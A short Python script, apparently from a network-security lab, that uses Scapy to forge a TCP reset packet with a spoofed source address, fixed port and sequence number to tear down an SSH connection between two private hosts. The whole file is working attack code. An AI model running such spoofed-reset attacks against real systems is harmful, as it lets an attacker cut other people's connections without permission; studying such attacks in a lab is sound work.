#!/usr/bin/python3
from scapy.all import *

print("SENDING RESET PACKET.........")
ip  = IP(src="172.17.0.2", dst="172.17.0.4")
tcp = TCP(sport=46304, dport=22,flags="R",seq=3206705447)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
